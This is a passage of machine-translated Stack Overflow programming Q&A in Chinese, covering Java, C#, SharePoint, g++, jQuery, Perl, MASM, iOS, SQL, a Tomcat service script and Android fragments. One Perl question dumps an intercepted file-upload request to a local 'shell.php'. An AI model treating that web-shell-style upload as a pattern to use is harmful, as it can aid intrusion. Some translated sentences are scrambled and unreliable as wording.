`Comparable`有关您需要分别实现和`Collections.sort`使用的 API 的详细信息，请参阅 javadocs 。（如果您不知道 javadocs 在哪里，请谷歌“Java 平台标准版 7 文档”并将页面添加为书签。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:37:01.110

我认为最好的方法是让 ParentClass 实现 Comparable，并实现 compareTo 以便它可以以所需的方式处理子类（例如，如果它是 ChildClass，请注意 date 属性）。

# c# - 添加具有人员或组字段的新列表项

> ID：15845591
> 
> 赞同：1
> 
> 时间：2013-04-06T00:17:57.967
> 
> 标签：c#, web-services, sharepoint, sharepoint-2007

我有一个 DataTable，我想使用表的 DataRows 中的数据将新项目添加到 Sharepoint 列表。但是我无法为类型为“个人或组”的字段添加数据，因为该字段似乎需要一个 ID，而不仅仅是“姓氏，名字”。我创建了一个类来构建 CAML 以调用`UpdateListItems()`，它适用于将任何其他类型的数据添加到列表中：

```
public class CAMLBuilder
{
    List<string> nameFields;

    public CAMLBuilder()
    {
        nameFields = new List<string>();
        nameFields.Add("Requestor");
    }

    public XmlElement batchAddElement(DataTable addTable)
    {
        XmlDocument doc = new XmlDocument();
        XmlElement element = doc.CreateElement("Batch");
        element.SetAttribute("OnError", "Continue");
        element.SetAttribute("ListVersion", "1");
        element.SetAttribute("ViewName", "");
        int methodCtr = 1;
        string batchStr = "";
        foreach (DataRow dr in addTable.Rows)
        {
            batchStr += "<Method ID='" + methodCtr + "' Cmd='New'>";
            foreach (DataColumn dc in addTable.Columns)
            {
                batchStr+="<Field Name='"+dc.ColumnName+"'>" + convertName(dc.ColumnName,Convert.ToString(dr[dc])) + "</Field>";
            }
            batchStr+="</Method>";
            methodCtr++;
        }
        element.InnerXml = batchStr;
        return element;
    }

    private string convertName(string columnName,string name)
    {
        if (nameFields.Contains(columnName))
        {
            name = "-1;#" + name;
        }
        return name;

    }

} 
```

我在本[次讨论](http://spservices.codeplex.com/discussions/277482)`"-1;#"`中将in视为一种解决方法，可让您避免查找此人的 ID。但它不起作用；我在返回的 XML 中收到此错误消息：`convertName()`

```
0x81020054The user does not exist or is not unique. 
```

有没有办法构建 CAML，这样我就不需要 ID 并且可以只使用名称？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T01:44:52.770

到目前为止，我的解决方案是使用`People.asmx`Web 服务。以下代码假定我创建了一个对名为 的 Web 服务的引用`PeopleService`，以及一个名为 的服务实例`ps`：

```
public string findPersonID(string searchText)
        {
            PeopleService.PrincipalInfo[] arrayPrincipalInfo = ps.SearchPrincipals(searchText, 10, PeopleService.SPPrincipalType.All);
            if (arrayPrincipalInfo.Count() > 0)
            {
                return Convert.ToString(arrayPrincipalInfo[0].UserInfoID);
            }
            else
            {
                return string.Empty;
            }
        } 
```

这并不理想，因为它要求我的 DataTable 中的每一行都必须单独调用 Web 服务（可能通过将所有相同的名称分组并为每个唯一名称只调用一次函数来优化），如果有的话，这将是很多 Web 流量很多名字。希望其他人有更好的解决方案。

# c++ - G ++中未附加到错误或警告的“注释”的含义是什么

> ID：15845592
> 
> 赞同：-1
> 
> 时间：2013-04-06T00:18:05.923
> 
> 标签：c++, boost, g++, boost-propertytree

在编译一些代码时，我收到了来自`g++`4.3.4 的以下奇怪消息：

```
...include/boost/property_tree/stream_translator.hpp: In member function 'typename
boost::enable_if<boost::property_tree::detail::is_translator<Translator>, Type>::type
boost::property_tree::basic_ptree<Key, Data, KeyCompare>::get_value(Translator) const
[with Type = ObjectType, Translator = boost::property_tree::stream_translator<char,
std::char_traits<char>, std::allocator<char>, ObjectType>, Key = std::basic_string<char,
std::char_traits<char>, std::allocator<char> >, Data = std::basic_string<char,
std::char_traits<char>, std::allocator<char> >, KeyCompare =
std::less<std::basic_string<char, std::char_traits<char>, std::allocator<char> > >]':
...include/boost/property_tree/stream_translator.hpp:189: note: 'e' was declared here 
```

附近没有警告或错误，我以前从未见过这样的事情`g++`。有谁知道发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T00:57:48.010

在这种情况下，GCC 正在尝试为发生进一步错误的位置提供上下文。您只显示了一个片段而不是完整的错误，但这就是正在发生的事情。

这通常发生在模板扩展期间。GCC 正在尝试提供扩展发生的上下文，因此您可以获得更多信息来解决此问题。当您嵌套和/或复杂模板时，这些“注释”可能非常有用。

修复这些错误的最简单方法是自上而下地工作，纠正您看到的第一个错误并移至下一个错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-05-01T02:06:21.533

我知道这是一个旧线程，但是在升级到新版本的 wxWidgets（从 3.0 到 3.1）和 g++（现在运行 g++ 5.3.1）之后，我突然看到了同样的事情。

在“注释”之前是一个警告，提醒注意使用在新版本的 wxWidgets 中标记为弃用的构造函数创建的类。该注释似乎只是显示了声明不推荐使用的构造函数版本的位置：

```
/home/uwake/programs/wx/cuds_db/gp/gpSimple.cpp:157:93: warning:
’wxFont::wxFont(int, int, int, int, bool, const wxString&, wxFontEncoding)’
is deprecated: use wxFONT{FAMILY,STYLE,WEIGHT}_XXX constants
[-Wdeprecated-declarations]
     fnt = wxFont ( 12, wxFONTFAMILY_ROMAN, wxNORMAL, wxNORMAL, false, "Times New Roman" );
                                                                                         ^
In file included from /usr/local/include/wx-3.1/wx/font.h:524:0,
             from /usr/local/include/wx-3.1/wx/window.h:23,
             from /usr/local/include/wx-3.1/wx/wx.h:38,
             from /usr/local/include/wx-3.1/wx/wxprec.h:42,
             from ./wx_pch.h:14,
             from <command-line>:0:
/usr/local/include/wx-3.1/wx/gtk/font.h:89:5: note: declared here
 wxFont(int size,
 ^ 
```

就我而言，我通过更改为不同的构造函数来消除警告和注释（尽管不是警告推荐的构造函数，它并不真正符合我的需要）。

# visual-studio - 无法将文件添加到项目中。此文件在项目目录树错误中

> ID：15845598
> 
> 赞同：14
> 
> 时间：2013-04-06T00:19:27.440
> 
> 标签：visual-studio, project, csproj

每当我尝试将文件添加到我的 Visual Studio 项目时，都会收到以下警告：

> 无法将文件 [文件名] 添加到项目中。此文件位于项目目录树中

如何修复此错误？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2013-04-09T16:56:51.280

进入您的 Windows 文件资源管理器并导航到 .csproj 文件并使用记事本（或 NotePad++ 等高级文本编辑器）打开它

您会注意到两行具有相似或重复的 Compile Include 行：

```
<Compile Include="..\ProjectDir\SubDir\MyClass.cs">
  <Link>"SubDir\MyClass.cs"</Link>
</Compile> 
```

删除上面的行，只保留与下面类似的行：

```
<Compile Include="SubDir\MyClass.cs" /> 
```

# c# - 语义上表示泛型

> ID：15845600
> 
> 赞同：4
> 
> 时间：2013-04-06T00:19:57.630
> 
> 标签：c#, generics, types, semantics

我试图以语义的方式理解泛型。例如，当我读到人们将抽象类称为可以设置策略的结构时，抽象类似乎对我来说就位。当我读到人们将它们称为协作合同时，界面就被抢购一空。

有哪些思考泛型的好方法可以帮助我将它们与其他 OO 结构区分开来并编写更智能的 API？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:31:14.297

将泛型类视为制作其他类的模板（类似地，泛型函数是制作其他功能的模板）。类型参数充当模板中的开口：通过将具体类型插入其中，您可以将泛型类或泛型函数变成真正的类或函数。类型参数“穿过”模板中的指定孔，产生完整的定义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T01:00:55.537

您似乎想从自上而下的角度来理解您的理解。定性意义上的“它是什么”，然后从那里得出真正的含义。简单地了解这些不同的构造*做什么*而不是尝试提出标签不是更容易吗？即从自下而上的角度处理它，并从您现在已经直接了解的内容中推断出您自己的定性描述。

抽象类要求你实现一个属性或方法，并且不能被实例化。它与接口有什么区别？它需要子类来选择你的作为它唯一的基类。接口没有这样的限制，但需要您在实现中定义它的整个行为，而不是依赖于要在基类中定义的某些行为。

同样，泛型允许您将类型作为可以由调用者指定的变量引入。它的实用性与一般的方法参数类似，只是提升到了更高的水平。换句话说，方法参数允许您根据调用者指定的某些输入来改变实现。通用参数允许您根据调用者指定的某些（其他）输入（即类型）来改变实现。

当然很清楚为什么`List<T>`比`ArrayList`. 我不太确定为什么隐喻真的有助于理解原因。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:28:34.797

您可以将它们视为对象类型的包装器。您正在创建的函数将为实例化的任何类型的对象执行某些操作，因此它就像一个模板，将为多种类型的对象执行相同的工作。

微软对泛型的介绍可能也有一些很好的描述

[http://msdn.microsoft.com/en-us/library/ms379564(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/ms379564(v=vs.80).aspx)

# java - Java制作行和列

> ID：15845604
> 
> 赞同：0
> 
> 时间：2013-04-06T00:20:32.293
> 
> 标签：java, output, system.out

使用字符输入和指定的列和行构建一个矩形。中间的空格。

对字符串 s、int r、int c 使用标准输入

```
private static void printstuff(String s, int r, int c) {

    colums(s, c);
    rows(s, c, r);
    colums(s, c);

}

// straight columns 

private static void colums(String cs, int cc) {
    for (int i = 1; i <= cc; i++) {
        System.out.print(cs);
    }

} 
```

这会创建所需的空格或 "" 来连接字符串，即制作 x"""""""""x

```
private static String whitespace(int wc) {
    String ws = " ";
    for (int i = 1; i <= wc - 3; i++) {
        ws += " ";
    }
    return ws;
} 
```

空格来构建一个矩形。

```
// downwards building

private static void rows(String rs, int rc, int rr) {
    String ws = whitespace(rc);
    for (int i = 1; i <= rr - 1; i++) {
        System.out.println(rs + ws + rs);

        // put strings together

    }

} 
```

} 空格和字符行来构建一个矩形。不用说它失败了。

样本输出：

```
XXXX    X  
X  X  
xxxx 
```

所需的输出：

```
xxxx  
x  x  
xxxx 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:49:09.187

下面的一个快速解决方案.. 干杯

```
public class Main {

public static void main(String[] args) {
    String s = "X";
    int totalColumns = 4;
    int totalRow = 3;

    colums(s, totalColumns);
    rows(s, totalColumns, totalRow);
    colums(s, totalColumns);

}

private static void colums(String cs, int cc) {
    for (int i = 0; i < cc; i++) {
        System.out.print(cs);
    }

}

private static String whitespace(int tc) {
    String ws = " ";
    for (int i = 1; i < tc - 2; i++) {
        ws += " ";
    }
    return ws;
}

private static void rows(String rs, int tc, int tr) {
    System.out.println();
    for (int i = 0; i < tr - 2  ; i++) {
        System.out.println(rs + whitespace(tc) + rs);
    }
} 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T00:41:25.767

我不确定这是否是您想要的，但抛出 System.out.println(""); 在列中的 for 循环之后

# java - 制作基本计算器时出现 StackOverFlowError

> ID：15845605
> 
> 赞同：-1
> 
> 时间：2013-04-06T00:20:34.867
> 
> 标签：java, calculator, stack-overflow

我正在尝试制作一个具有 4 个功能并且基于单词的计算器。当我尝试实现操作选择时，我得到一个 stackoverflow 错误。

类计算器：

```
package us.plexproductions.main;

import java.util.Scanner;

public class Calculator {

public static int firstnum;
public static int secondnum;
public static int answer;
public static int operation;

Calculator c = new Calculator();
static Scanner s = new Scanner(System.in);

static Operations o = new Operations();

public static void main(String[] args) {

    prompt();
    start();
}

public static void prompt() {
    System.out.println("########################");
    System.out.println("#Calculator Version 1.0#");
    System.out.println("########################");
    System.out.println("************************");
    System.out.println("This is a calculator that\ncan add, subtract, multiply, and divide\n" +
                       "multiple numbers at once.");
    System.out.println("------------------------");
    System.out.println("Start Calculating by Entering A Number and Then\nspelling out the operation you " +
                       "want to preform to that\nnumber and type in another number.");
}

public static void start() {
    System.out.println("------------------------");
    System.out.println("Enter Your First Number: ");
    firstnum = s.nextInt();
    System.out.println("------------------------");
    System.out.println("Which operation would you like to use?\nAddition = 1, Subtraction = 2, Multiplication = 3, or Division = 4?");
    operation = s.nextInt();
    second();

}

public static void second() {
    if (operation == 1) {
        o.addition();
    }
    if (operation == 2) {
        o.subtraction();
    }
    if (operation == 3) {
        o.multiplication();
    }
    if (operation == 4) {
        o.division();
    }
}
} 
```

类操作：

```
package us.plexproductions.main;

import java.util.Scanner;

public class Operations {

Calculator c = new Calculator();
Scanner s2 = new Scanner(System.in);

public void addition() {
    System.out.println("Addition Selected.");
    System.out.println("Enter Second Number: ");
    Calculator.secondnum = s2.nextInt();
}

public void subtraction() {

}

public void multiplication() {

}

public void division() {

}
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-06T00:26:09.423

的每个实例为该字段`Calculator`创建一个。这些，反过来，创造更多，等等。`new Calculator()``c``Calculators``Calculators`

发生这种`StackOverflowError`情况是因为对构造函数的这一系列调用`Calculator`永远不会结束，会填满所有可用的堆栈内存。看来您*不需要*该 nested `Calculator`，因此请尝试将其删除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:30:38.380

A`StackOverflowError`当你调用太多函数，吃掉所有可用的[堆栈](http://en.wikipedia.org/wiki/Call_stack)时会发生。递归函数调用次数过多可能会发生这种情况。例如，以下`factorial`函数在我的机器上溢出：

```
public class Factorial {
    public static int factorial(int n){
        if (n == 1) return 1;
        return n * factorial(n-1);
    }

    public static void main(String[] args){
        factorial(10000);
    }
} 
```

现在，您在代码中的什么地方使用递归？

```
public class Calculator{
    Calculator c = new Calculator();
    ...
} 
```

# jquery - 关于选择子项和浏览 DOM 的简单 Jquery

> ID：15845608
> 
> 赞同：0
> 
> 时间：2013-04-06T00:20:47.370
> 
> 标签：jquery, html, dom

好吧，我认为这应该很容易做到。但是我就是无法绕开它..这是我拥有的代码..在我的应用程序中，我选择了 .scroller 类。从那里我使用 .parent() 进入#exerciseWrapper 类。我的目标是 h2 标签。我不知道如何从这里继续下去，没有任何效果。find() 浏览整个 DOM，而 children() 只浏览一个孩子..

$('.scroller').parent() 什么东西？？唔..

```
 var append='<div class="exerciseWrapper"><div class="allTextWrapper"><div class="headerWrapper"><h2 class="exerciseHeaderName">'+exerciseName+'</h2></div><div class="lastConfigUsedHeader">Last configuration used:</div><div class="lastUsedConfig">Sets: 10, Kg: 12302, Time:10.30</div></div><div class="scroller">'+ 
'<div class="divImgContainer"><img src="../images/exercises/logo.png" class="scrollImages"></div>'+
'<div class="divImgContainer"><img src="../images/exercises/MuscleGroup1.png" class="scrollImages"></div>'+
'<div class="divImgContainer"><img src="../images/exercises/logo.png" class="scrollImages"></div>'+
'<div class="divImgContainer"><img src="../images/exercises/MuscleGroup1.png" class="scrollImages"></div>'+
'<div class="divImgContainer"><img src="../images/exercises/logo.png" class="scrollImages"></div>'+
'<div class="divImgContainer"><img src="../images/exercises/MuscleGroup1.png" class="scrollImages"></div>'+
      '</div></div>' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T00:23:29.943

实际上，`find()`仅枚举活动元素下的元素。来自 jQuery API：

> **描述**：获取当前匹配元素集中每个元素的后代，由选择器、jQuery 对象或元素过滤。

您应该能够使用：

```
$('.scroller').parent().find('h2') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T00:24:49.907

Find 不会浏览您可以选择的整个 DOM：

```
$('.scroller').parent('div.exerciseWrapper').find('div.headerWrapper h2') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-07T02:01:22.380

```
$('.scroller').parent('div.exerciseWrapper').find('div.headerWrapper h2') 
```

为我工作

# perl - Perl 中的 HTTP::代理

> ID：15845610
> 
> 赞同：0
> 
> 时间：2013-04-06T00:21:03.827
> 
> 标签：perl

我需要显示散列中的“内容”，我使用： $c->header("content") 进行测试，但没有显示任何内容，但如果这样，则显示内容散列值。

因为我可以显示_content？

哈希

```
<pre>
$VAR1 = bless(
    {
        '_protocol' => 'HTTP/1.1',
        '_content'  => '-----------------------------8283483225031
Content-Disposition: form-data; name="archivo"; filename="GFWLIVESetupLog.txt"
Content-Type: text/plain

  l i v e R e d i s t :   0
 G F W L C l i e n t :   0

-----------------------------8283483225031
Content-Disposition: form-data; name="destino"

C:/perl/test.txt
-----------------------------8283483225031--
',
        '_uri' => bless(
            do {
                \(
                    my $o =
                      'http://localhost/shell.php?uploa
d='
                );
            },
            'URI::http'
        ),
        '_headers' => bless(
            {
                'user-agent' => 'Mozilla/5.0 (Windows NT
 5.1; rv:19.0) Gecko/20100101 Firefox/19.0',
                'accept' => 'text/html,application/xhtml
+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language' => 'es-ar,es;q=0.8,en-
us;q=0.5,en;q=0.3',
                'cookie' => 'PHPSESSID=a8bkktvsripf6agpi
fnma61qq4',
                'content-length' => '378',
                'host'           => 'localhost',
                'via'            => '1.1 doddy-701c8cb49 (HTTP::Pro
xy/0.20)',
                'content-type' => 'multipart/form-data;
boundary=---------------------------8283483225031',
                'x-forwarded-for' => '127.0.0.1',
                'referer'         => 'http://localhost/shell.php
?upload='
            },
            'HTTP::Headers'
        ),
        '_method' => 'POST'
    },
    'HTTP::Request'
);

</pre> 
```

来源 ：

```
use HTTP::Proxy;
use HTTP::Proxy::BodyFilter::simple;
use HTTP::Proxy::BodyFilter::complete;
use Data::Dumper;

my $server = HTTP::Proxy->new(port=>8080);
$server->host();

$server->push_filter(mime=>undef,response => HTTP::Proxy::BodyFilter::complete->new());

$server->push_filter(
mime=>undef,
request=>HTTP::Proxy::BodyFilter::simple->new(\&enable),
response => HTTP::Proxy::BodyFilter::simple->new(\&enable2));

$server->start();

sub enable {

    my($a,$b,$c,$d,$e) = @_;

print $c->header("content");

    #print Dumper $c;

}

sub enable2 {
 my ($j,$k,$l,$m,$n) = @_;
  print $$k;
} 
```

pd : 原谅我的英语不好

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T01:31:51.233

内容不在标题中。在您的转储程序输出中，标头是键`HTTP::Headers`表示的对象`_headers`。您想调用该`content`方法。

```
$c->content; 
```

有关可用方法的完整列表，请参阅[HTTP::Request 文档。](http://search.cpan.org/~gaas/HTTP-Message-6.06/lib/HTTP/Request.pm)

# assembly - 如何下载（或编译）库“stdlib.lib”和“stdlib.a”？（用于组装）

> ID：15845615
> 
> 赞同：0
> 
> 时间：2013-04-05T11:49:38.700
> 
> 标签：assembly, libraries, masm, masm32

我有以下代码：

```
include stdlib.a
includelib stdlib.lib 
```

但是在组装时，它给了我一个错误：“*无法打开文件：stdlib.a* ”

我没有任何名为“stdlib.lib”或“stdlib.a”的文件。

我一直在寻找那些文件，但我找不到它们。我能找到的唯一文件是“stdlib.h”（看看 Ramhound 的答案），但 WinAsm 在编译时无法识别它。

有没有办法将“stdlib.h”转换为“stdlib.lib”或“stdlib.a”，或者在汇编中使用？（**来自 Ramhound 的回答**：*“stdlib.h”是头文件，而不是库。它不能转换为“stdlib.lib”或“stdlib.a”*）。

谢谢！！！

**编辑 1** 在 Ramhound 的回答中，他解释说*stdlib.h*是一个“标题”，而不是一个库。有人可以帮我解决*stdlib.lib*和*stdlib.a*吗？

我一直在寻找那些文件，但我找不到它们。我会很感激这些图书馆的一些帮助。（为什么每个人都有，但我找不到下载地址？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T02:36:53.457

WinASM 是一个 IDE，而不是一个汇编程序。两者都是`include`MASM `includelib`。如果你想使用 C 函数，你需要链接微软的 C 运行时 - MSVCRT.dll。MASM32 包含`inc`和导入库：

```
include msvcrt.inc
includelib msvcrt.lib 
```

MASM32 导入库`crt_`添加到函数名称之前，因此`wscanf`会被调用`crt_wscanf`

# ios - 如何将 UITextField 光标移动到下一个文本字段

> ID：15845621
> 
> 赞同：7
> 
> 时间：2013-04-06T00:22:37.953
> 
> 标签：ios, uitextfield

我有三个文本字段，我希望能够将光标移动到下一个。当到达最后一个时，键盘关闭。但没有什么对我有用......这是我所拥有的一个例子。但是，没有任何动作，当我选择下一个按钮时也没有任何反应。

```
- (BOOL)textFieldShouldReturn:(UITextField *)textField {
    if (textField == field1TextField) {
        [textField resignFirstResponder];
        [field2TextField becomeFirstResponder];
    } 
    else if (textField == field2TextField) {
        [textField resignFirstResponder];
        [field3TextField becomeFirstResponder];
    }
    else if (textField == field3TextField) {
        [textField resignFirstResponder];
    }
    return YES;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T00:29:54.477

此方法绑定的对象应设置为文本字段的委托。通过在方法中设置断点来检查这一点，以验证它是否在您认为它被调用时被调用。

如果您使用的是 nib 或故事板，则`field...`实例变量应该是正确连接的插座。如果它们是以编程方式创建的，则应确保它们具有分配给它们的对象。当您在方法中时，通过检查这些变量的值来验证这一点。

`resignFirstResponder`在调用另一个控件之前，您不必调用其他控件`becomeFirstResponder`。

# java - 如何使用文件路径获取文件位置？

> ID：15845622
> 
> 赞同：1
> 
> 时间：2013-04-06T00:22:39.517
> 
> 标签：java, eclipse, file-io

在 Eclipse 中，当我在项目中右键单击要输入的文件时，它会显示两件事： 路径：/SWT/src/data.txt 位置：C:\Users\Yoshikawa\workspace\SWT\src\data 。文本

有什么方法可以获取位置 (C:\Users\Yoshikawa\workspace\SWT\src\data.txt) 我只知道路径 (/SWT/src/data.txt) 吗？

前任。

```
public String ReadFile(String file_path) {
        //Search current project directory 

            return file_location
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T00:31:23.477

```
public String readFile(String file_path){
  File f = new File(file_path);
  return f.getAbsolutePath();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T02:20:59.710

您可以使用 File.getAbsolutePath 或 File.getCanonicalPath。它们不一样，看看区别

```
 String relativePath = "../1.txt";
    System.out.println(new File(relativePath).getCanonicalPath());
    System.out.println(new File(relativePath).getAbsolutePath()); 
```

输出

```
D:\workspace1\1.txt
D:\workspace1\x\..\1.txt 
```

有关详细信息，请参阅 java.io.File API

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T00:30:41.467

您尝试基于 file_path 创建一个 File 对象，然后运行 ​​File 类的 getAbsolutePath() 方法。h 您可以在此处阅读更多信息：http: [//docs.oracle.com/javase/6/docs/api/java/io/File.html](http://docs.oracle.com/javase/6/docs/api/java/io/File.html) 希望这可行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T00:36:45.307

看一下 Java[路径类](http://docs.oracle.com/javase/tutorial/essential/io/pathClass.html)。

# sql - SQL Server - 使用多个连接和字符串分组

> ID：15845625
> 
> 赞同：1
> 
> 时间：2013-04-06T00:23:14.690
> 
> 标签：sql, join, group-by, concat

我已经搜索了许多类似的主题，但仍在努力使其正常工作。我正在尝试对一列进行分组，特别是在进行了一些表连接之后。任何帮助将不胜感激

今天的输出

```
Account System  System  Plan Code   Account Plan Code   Request
12345   Sys1    Sys1    P1         12345    P1          00001
12345   Sys1    Sys1    P2         NULL     NULL        NULL
12345   Sys2    Sys2    P3         12345    P3          00002
34567   Sys1    Sys1    P1         NULL     NULL        NULL
34567   Sys1    Sys1    P2         34567    P2          00003
45678   Sys3    Sys3    P4         NULL     NULL        NULL 
```

期望的输出

```
Account System  System  Plan Code   Account Plan Code   Request
12345   Sys1    Sys1    P1          12345   P1, P2      00001
12345   Sys2    Sys2    P3          12345   P3          00002
34567   Sys1    Sys1    P2          34567   P1,P2       00003
45678   Sys3    Sys3    P4          NULL    NULL        NULL 
```

我正在加入一些表格，并且我想将每个唯一帐户到系统映射的计划代码组合成一行。

*   Tab1 = 帐户和系统
*   Tab2 = 系统和计划代码（显示与每个系统相关的计划代码的映射）
*   Tab3 = 帐户、计划代码、请求#

我迷失了 group by 我尝试了一列 GROUP BY 并得到不是 GROUP By Expression 的错误。所以我包括了所有的列，这根本不会改变输出。

```
SELECT      A.ACCOUNT, A.SYSTEM, B.SYSTEM, B.PCODE, C.ACCOUNT, C.PCODE, C.REQUEST
FROM        MYDB.TAB1 A
LEFT JOIN   MYDB.TAB2 B 
ON      A.SYSTEM = B.SYSTEM
LEFT JOIN   MYDB.TAB3 C
ON      A.ACCOUNT = C.ACCOUNT AND B.PCODE = C.PCODE
WHERE       A.ACCOUNT IS NOT NULL
ORDER BY    A.ACCOUNT 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T02:30:40.780

如果您不需要连接计划，请查看以下`GROUP BY`实现是否适合您的需求。我为此脚本删除了几列。为了遵守我使用的聚合查询限制`MAX`（`C.PCODE`可能也是`MIN`如此），`MAX`这`C.REQUEST`似乎是摆脱`NULL`s 的好选择。

```
SELECT      A.ACCOUNT, A.SYSTEM, MAX(C.PCODE), MAX(C.REQUEST)
FROM        MYDB.TAB1 A
LEFT JOIN   MYDB.TAB2 B 
ON      A.SYSTEM = B.SYSTEM
LEFT JOIN   MYDB.TAB3 C
ON      A.ACCOUNT = C.ACCOUNT AND B.PCODE = C.PCODE
WHERE       A.ACCOUNT IS NOT NULL
GROUP BY A.ACCOUNT, A.SYSTEM
ORDER BY    A.ACCOUNT 
```

# linux - 从服务运行 Jconsole：CentOS

> ID：15845626
> 
> 赞同：1
> 
> 时间：2013-04-06T00:23:28.260
> 
> 标签：linux, service, jconsole

我在我的 CentOS 6.3 机器上安装了 Tomcat，并通过创建`/etc/init.d/tomcat`文件使其成为服务。它适用于基本的启动、停止、重启和状态功能。

我经常在服务器上使用 jconsole，所以我认为将这个功能构建到服务中（通过运行`service tomcat monitor`）而不是必须运行`ps aux|grep java`然后运行`jconsole <Java PID>`​​.

这是我的服务脚本（只是监控部分）：

```
monitor)
        # Check for Tomcat PID (greps are separated to prevent returning the single grep PID)
        FOUND_PID=$(ps aux |grep  $JAVA_HOME/bin/ | grep java |awk -F' ' '{print $2}')
        if [[ $FOUND_PID ]]
        then
                echo -e $JAVA_HOME/bin/jconsole $FOUND_PID
                $JAVA_HOME/bin/jconsole $FOUND_PID
        else
                echo -e "Failed: Tomcat is not currently running";
        fi
;; 
```

当我直接运行 bash 脚本时，监视器部分中的所有内容都可以正常工作，但是当服务调用它时，它只是挂在 jconsole 行并且不执行任何操作。

当我运行时`service tomcat monitor`，我确实得到了正确的路径输出，所以我知道路径是正确的。

从服务脚本调用时，有没有办法让 jconsole 工作？

# android - 将 PreferenceFragment 添加到 FragmentPagerAdapter

> ID：15845632
> 
> 赞同：11
> 
> 时间：2013-04-06T00:23:50.427
> 
> 标签：android, android-fragmentactivity

我正在尝试将 a 添加 `PreferenceFragment`到`FragmentPagerAdapter`.

我的课程扩展`FragmentActivity`了，我尝试过`FragmentTransaction`，如下所示，并尝试添加到容器中，但似乎无法正常工作。*没有*错误被抛出，实际上什么也没有发生。

**主要活动：**

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    mSectionsPagerAdapter = new SectionsPagerAdapter(getSupportFragmentManager());
    mViewPager = (ViewPager) findViewById(R.id.pager);
    mViewPager.setAdapter(mSectionsPagerAdapter);
} 
```

**活动主.xml：**

```
<android.support.v4.view.ViewPager 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/pager"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity" >
</android.support.v4.view.ViewPager> 
```

**我的选项菜单选择：**

```
android.app.FragmentManager fm;
@Override
public boolean onOptionsItemSelected(MenuItem item) {
    switch (item.getItemId()) {
    case R.id.menu_settings:
        JJSettings settings = new JJSettings();
        fm = getFragmentManager();
        FragmentTransaction fragTrans = fm.beginTransaction();
        // I also tried `replace()` here as well. Same 'nothing happens' result.
        fragTrans.add(settings, "settings");
        fragTrans.commit();
        return true;
    case R.id.menu_help:
        menuHelp();
        return true;
    default:
        return super.onOptionsItemSelected(item);
    }
} 
```

**我的设置** `Fragment`**：**

```
public class JJSettings extends PreferenceFragment {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        addPreferencesFromResource(R.xml.settings);
    }
} 
```

如果可能的话，我的偏好是坚持使用`Fragments`，这意味着如果可能的话，我宁愿不扩展`PreferenceActivity`或将用户带到另一个调用 的 Activity `PreferenceFragment`。我只是希望我在研究中遗漏了一些东西。

* * *

**编辑**

```
public class SectionsPagerAdapter extends FragmentPagerAdapter {
    private int _count = 2;

    public SectionsPagerAdapter(FragmentManager fm) { super(fm); }

    @Override
    public Object instantiateItem(ViewGroup container, int position) {
        return super.instantiateItem(container, position);
    }

    @Override
    public Fragment getItem(int position) {
        switch (position) {
        case 0:
            return new JJMainFragment();
        case 1:
            return new JJPendingFragment();
        default:
            return null;
        }
    }

    public void setCount(int count) { this._count = count; }

    @Override
    public int getCount() { return this._count; }

    @Override
    public CharSequence getPageTitle(int position) {
        switch (position) {
        case 0:
            return getString(R.string.c_list).toUpperCase(Locale.ENGLISH);
        case 1:
            return getString(R.string.c_pending).toUpperCase(Locale.ENGLISH);
        }
        return null;
    }
} 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-29T19:26:05.817

[这个答案](https://stackoverflow.com/questions/13501424/fragmentpageradapter-exists-only-in-android-support-v4-app-and-not-android-app)让我找到了使用 v13 支持库的解决方案，其中包括一个使用真正的 android.app.Fragments 的 FragmentPagerAdapter，因此它可以支持 PreferenceFragment。

假设您使用 Eclipse 并使用“Scrollable Tabs + Swipe”导航（它为您提供 v4 寻呼机样板）运行新的应用程序向导，以下是升级到 v13 所需的修改：

*   从您的 libs 文件夹中删除“android-support-v4.jar”文件
*   从 SDK_PATH\extras\android\support\v13 复制“android-support-v13.jar”；如果不存在，请使用 SDK 管理器安装或更新“Extras/Android 支持库”

然后，在 Java 文件中：

*   将 FragmentPagerAdapter 导入从 v4 更改为 v13
*   将 FragmentActivity 更改为普通 Activity
*   将对 getSupportFragmentManager 的调用更改为 getFragmentManager
*   从 android.app 而不是 android.support.v4 导入所有必要的类
*   （除了：您仍然需要使用 v4 ViewPager，但它是兼容的）

我已经复制了下面的修改源，在最新的 Jellybean 上进行了验证。

MainActivity.java：

```
package com.example.pagerwithpreferencesfragment;

import java.util.Locale;

